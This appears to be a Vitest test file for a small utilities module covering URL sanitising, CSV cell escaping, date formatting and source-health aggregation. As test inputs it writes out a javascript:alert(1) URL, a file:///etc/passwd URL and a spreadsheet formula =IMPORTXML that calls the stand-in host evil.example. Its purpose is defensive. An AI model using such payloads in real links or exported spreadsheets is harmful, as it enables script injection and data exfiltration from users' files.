import { describe, expect, it } from 'vitest';
import { csvCell, formatDate, safeUrl } from './utils';
describe('evidence exports and external links',()=>{
 it('allows only public http(s) URLs without embedded credentials',()=>{expect(safeUrl('javascript:alert(1)')).toBe('');expect(safeUrl('https://token:secret@example.com')).toBe('');expect(safeUrl('file:///etc/passwd')).toBe('');expect(safeUrl('https://example.com/news?id=2')).toBe('https://example.com/news?id=2');});
 it('prevents spreadsheet formula execution while preserving numeric negatives',()=>{expect(csvCell(' =IMPORTXML("https://evil.example","x")')).toBe('"\' =IMPORTXML(""https://evil.example"",""x"")"');expect(csvCell('@SUM(A1)')).toBe('"\'@SUM(A1)"');expect(csvCell(-12)).toBe('"-12"');expect(csvCell('a,b\nc')).toBe('"a,b\nc"');});
 it('never invents publication dates and uses Japan display timezone',()=>{expect(formatDate('')).toBe('不明');expect(formatDate('invalid')).toBe('不明');expect(formatDate('2026-10-21T00:00:00Z')).toContain('09:00');});
});

describe('current source health',()=>{
 it('displays recovery while retaining failures for different scopes',async()=>{
  const {latestCollectionRuns}=await import('./utils');
  const base={source:'bluesky',regionCode:null,startedAt:'2026-10-20T00:00:00Z',count:0};
  const rows=latestCollectionRuns([{...base,id:'old',scope:'author:a',finishedAt:'2026-10-20T00:00:00Z',status:'error'},{...base,id:'new',scope:'author:a',finishedAt:'2026-10-21T00:00:00Z',status:'success',count:3},{...base,id:'search',scope:'query:matcha',finishedAt:'2026-10-21T00:00:00Z',status:'error'}]);
  expect(rows).toHaveLength(2);expect(rows.filter(r=>r.status==='error').map(r=>r.id)).toEqual(['search']);
 });
});
